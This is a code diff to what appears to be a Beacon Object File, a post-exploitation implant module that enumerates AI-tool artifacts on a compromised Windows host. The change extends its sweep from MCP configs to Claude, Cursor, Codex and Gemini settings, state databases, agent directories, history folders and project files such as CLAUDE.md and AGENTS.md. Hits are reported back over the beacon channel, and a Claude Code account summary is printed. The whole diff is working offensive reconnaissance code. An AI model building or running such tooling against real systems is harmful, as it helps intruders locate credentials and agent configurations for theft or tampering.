@@ -84,14 +84,14 @@ typedef struct _PROCESS_INFORMATION {
 #include "beacon.h"
 
 #define MAX_PATH_LEN 520
-#define MAX_PROJECT_HITS 16
+#define MAX_PROJECT_HITS 48
 
 #define SECTION_WINDOWS_COPILOT "[i] Windows Copilot"
 #define SECTION_OFFICE_COPILOT  "[i] Office Copilot"
 #define SECTION_EDGE_COPILOT    "[i] Edge Copilot"
 #define SECTION_GH_COPILOT      "[i] GitHub Copilot"
 #define SECTION_THIRD_PARTY_AI  "[i] Third-party AI"
-#define SECTION_MCP_CONFIGS     "[i] MCP Configuration Discovery"
+#define SECTION_AI_ARTIFACTS    "[i] AI Configuration and Agent Artifact Discovery"
 
 #ifndef INVALID_HANDLE_VALUE
 #define INVALID_HANDLE_VALUE ((HANDLE)-1)
@@ -151,7 +151,7 @@ typedef struct {
 typedef WIN32_FIND_DATAW *LPWIN32_FIND_DATAW;
 
 typedef struct {
-    int mcp_files_found;
+    int artifacts_found;
     int project_hits;
 } scan_results_t;
 
@@ -339,6 +339,25 @@ static int is_directory(const wchar_t *path) {
     return ((attr & FILE_ATTRIBUTE_DIRECTORY) != 0);
 }
 
+static int expanded_path_exists(const wchar_t *pattern, int expect_directory, wchar_t *out_path, size_t out_size) {
+    DWORD needed;
+
+    if (!pattern || !out_path || out_size == 0) {
+        return 0;
+    }
+
+    inline_memset(out_path, 0, out_size * sizeof(wchar_t));
+    needed = KERNEL32$ExpandEnvironmentStringsW(pattern, out_path, (DWORD)out_size);
+    if (needed == 0 || needed > out_size) {
+        return 0;
+    }
+
+    if (expect_directory) {
+        return is_directory(out_path);
+    }
+    return path_exists(out_path);
+}
+
 static void report_path_if_exists(const wchar_t *label, const wchar_t *path) {
     if (!label || !path) {
         return;
@@ -507,7 +526,7 @@ static void print_claude_code_account_summary(const wchar_t *path) {
     KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
 }
 
-static int preview_config_file(const wchar_t *label, const wchar_t *path, scan_results_t *results) {
+static int report_artifact_hit(const wchar_t *label, const wchar_t *path, scan_results_t *results) {
     if (!label || !path || !results) {
         return 0;
     }
@@ -515,7 +534,7 @@ static int preview_config_file(const wchar_t *label, const wchar_t *path, scan_r
         return 0;
     }
 
-    results->mcp_files_found++;
+    results->artifacts_found++;
     BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, path);
     if (wide_equals(label, L"Claude Code MCP Config")) {
         print_claude_code_account_summary(path);
@@ -523,16 +542,74 @@ static int preview_config_file(const wchar_t *label, const wchar_t *path, scan_r
     return 1;
 }
 
-static int preview_expanded_config(const wchar_t *label, const wchar_t *pattern, scan_results_t *results) {
-    wchar_t path[MAX_PATH_LEN];
-    DWORD needed;
-
-    inline_memset(path, 0, sizeof(path));
-    needed = KERNEL32$ExpandEnvironmentStringsW(pattern, path, MAX_PATH_LEN);
-    if (needed == 0 || needed > MAX_PATH_LEN) {
+static int report_directory_hit(const wchar_t *label, const wchar_t *path, scan_results_t *results) {
+    if (!label || !path || !results) {
         return 0;
     }
-    return preview_config_file(label, path, results);
+    if (!is_directory(path)) {
+        return 0;
+    }
+
+    results->artifacts_found++;
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, path);
+    return 1;
+}
+
+static int report_expanded_artifact(const wchar_t *label, const wchar_t *pattern, int expect_directory, scan_results_t *results) {
+    wchar_t path[MAX_PATH_LEN];
+
+    if (!expanded_path_exists(pattern, expect_directory, path, MAX_PATH_LEN)) {
+        return 0;
+    }
+    if (expect_directory) {
+        return report_directory_hit(label, path, results);
+    }
+    return report_artifact_hit(label, path, results);
+}
+
+static void scan_immediate_children_for_suffix(const wchar_t *root, const wchar_t *child_suffix, const wchar_t *label, int expect_directory, scan_results_t *results) {
+    wchar_t search[MAX_PATH_LEN];
+    wchar_t candidate[MAX_PATH_LEN];
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+
+    if (!root || !child_suffix || !label || !results || !is_directory(root)) {
+        return;
+    }
+
+    inline_memset(search, 0, sizeof(search));
+    inline_memset(candidate, 0, sizeof(candidate));
+    inline_memset(&fd, 0, sizeof(fd));
+
+    if (!build_path(root, L"\\*", search, MAX_PATH_LEN)) {
+        return;
+    }
+
+    hFind = KERNEL32$FindFirstFileW(search, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    do {
+        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0 || fd.cFileName[0] == L'.') {
+            continue;
+        }
+
+        inline_memset(candidate, 0, sizeof(candidate));
+        if (!build_path(root, L"\\", candidate, MAX_PATH_LEN) ||
+            !append_wide_in_place(candidate, fd.cFileName, MAX_PATH_LEN) ||
+            !append_wide_in_place(candidate, child_suffix, MAX_PATH_LEN)) {
+            continue;
+        }
+
+        if (expect_directory) {
+            report_directory_hit(label, candidate, results);
+        } else {
+            report_artifact_hit(label, candidate, results);
+        }
+    } while (KERNEL32$FindNextFileW(hFind, &fd));
+
+    KERNEL32$FindClose(hFind);
 }
 
 static void check_taskbar_ai_setting(void) {
@@ -973,7 +1050,7 @@ static void scan_vscode_mcp_extensions(const wchar_t *storage_root, const wchar_
             any = 1;
         }
         BeaconPrintf(CALLBACK_OUTPUT, "[+] %S\\%S\n", storage_root, fd.cFileName);
-        results->mcp_files_found++;
+        results->artifacts_found++;
     } while (KERNEL32$FindNextFileW(hFind, &fd));
 
     KERNEL32$FindClose(hFind);
@@ -991,7 +1068,7 @@ static void inspect_project_candidate(const wchar_t *project_path, scan_results_
 
     inline_memset(candidate, 0, sizeof(candidate));
     if (build_path(project_path, L"\\.mcp.json", candidate, MAX_PATH_LEN) &&
-        preview_config_file(L"Project .mcp.json", candidate, results)) {
+        report_artifact_hit(L"Project .mcp.json", candidate, results)) {
         results->project_hits++;
     }
 
@@ -1001,7 +1078,97 @@ static void inspect_project_candidate(const wchar_t *project_path, scan_results_
 
     inline_memset(candidate, 0, sizeof(candidate));
     if (build_path(project_path, L"\\.cursor\\rules\\mcp.json", candidate, MAX_PATH_LEN) &&
-        preview_config_file(L"Project Cursor MCP", candidate, results)) {
+        report_artifact_hit(L"Project Cursor MCP", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\.claude\\settings.json", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project Claude Settings", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\.claude\\settings.local.json", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project Claude Local Settings", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\CLAUDE.md", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project CLAUDE.md", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\AGENTS.md", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project AGENTS.md", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\AGENTS.override.md", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project AGENTS.override.md", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\.cursor\\rules", candidate, MAX_PATH_LEN) &&
+        report_directory_hit(L"Project Cursor Rules", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\.cursor\\environment.json", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project Cursor Environment", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\.cursorrules", candidate, MAX_PATH_LEN) &&
+        report_artifact_hit(L"Project .cursorrules", candidate, results)) {
+        results->project_hits++;
+    }
+
+    if (results->project_hits >= MAX_PROJECT_HITS) {
+        return;
+    }
+
+    inline_memset(candidate, 0, sizeof(candidate));
+    if (build_path(project_path, L"\\.gemini", candidate, MAX_PATH_LEN) &&
+        report_directory_hit(L"Project Gemini Directory", candidate, results)) {
         results->project_hits++;
     }
 }
@@ -1085,16 +1252,29 @@ static void check_mcp_configs(scan_results_t *results) {
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_MCP_CONFIGS ":\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_AI_ARTIFACTS ":\n");
 
-    preview_expanded_config(L"Claude Desktop MCP Config", L"%APPDATA%\\Claude\\claude_desktop_config.json", results);
-    preview_expanded_config(L"Claude Code MCP Config", L"%USERPROFILE%\\.claude.json", results);
-    preview_expanded_config(L"Cursor Global MCP Config", L"%USERPROFILE%\\.cursor\\mcp.json", results);
-    preview_expanded_config(L"Windsurf MCP Config", L"%USERPROFILE%\\.codeium\\windsurf\\mcp_config.json", results);
+    report_expanded_artifact(L"Claude Desktop MCP Config", L"%APPDATA%\\Claude\\claude_desktop_config.json", 0, results);
+    report_expanded_artifact(L"Claude Code MCP Config", L"%USERPROFILE%\\.claude.json", 0, results);
+    report_expanded_artifact(L"Claude User Settings", L"%USERPROFILE%\\.claude\\settings.json", 0, results);
+    report_expanded_artifact(L"Claude User Agents Directory", L"%USERPROFILE%\\.claude\\agents", 1, results);
+    report_expanded_artifact(L"Cursor Global MCP Config", L"%USERPROFILE%\\.cursor\\mcp.json", 0, results);
+    report_expanded_artifact(L"Cursor Global State DB", L"%APPDATA%\\Cursor\\User\\globalStorage\\state.vscdb", 0, results);
+    report_expanded_artifact(L"Windsurf MCP Config", L"%USERPROFILE%\\.codeium\\windsurf\\mcp_config.json", 0, results);
+    report_expanded_artifact(L"Codex Config", L"%USERPROFILE%\\.codex\\config.toml", 0, results);
+    report_expanded_artifact(L"Codex AGENTS.md", L"%USERPROFILE%\\.codex\\AGENTS.md", 0, results);
+    report_expanded_artifact(L"Codex Skills Directory", L"%USERPROFILE%\\.codex\\skills", 1, results);
+    report_expanded_artifact(L"Codex Rules Directory", L"%USERPROFILE%\\.codex\\rules", 1, results);
+    report_expanded_artifact(L"Codex History Directory", L"%USERPROFILE%\\.codex\\history", 1, results);
+    report_expanded_artifact(L"Gemini User Directory", L"%USERPROFILE%\\.gemini", 1, results);
 
     inline_memset(appData, 0, sizeof(appData));
     inline_memset(path, 0, sizeof(path));
     if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH_LEN) > 0) {
+        if (build_path(appData, L"\\Cursor\\User\\globalStorage", path, MAX_PATH_LEN)) {
+            scan_immediate_children_for_suffix(path, L"\\state.vscdb", L"Cursor Extension State DB", 0, results);
+        }
+        inline_memset(path, 0, sizeof(path));
         if (build_path(appData, L"\\Code\\User\\globalStorage", path, MAX_PATH_LEN)) {
             scan_vscode_mcp_extensions(path, L"VS Code", results);
         }
@@ -1112,13 +1292,13 @@ static void check_mcp_configs(scan_results_t *results) {
         scan_project_root_pattern(project_roots[i], results);
     }
 
-    if (results->mcp_files_found == 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[i] No MCP configs discovered in default global or project roots\n");
+    if (results->artifacts_found == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[i] No AI config or agent artifacts discovered in default global or project roots\n");
     } else {
         BeaconPrintf(
             CALLBACK_OUTPUT,
-            "[i] MCP summary: %d artifacts\n",
-            results->mcp_files_found
+            "[i] Artifact summary: %d hits\n",
+            results->artifacts_found
         );
     }
 }
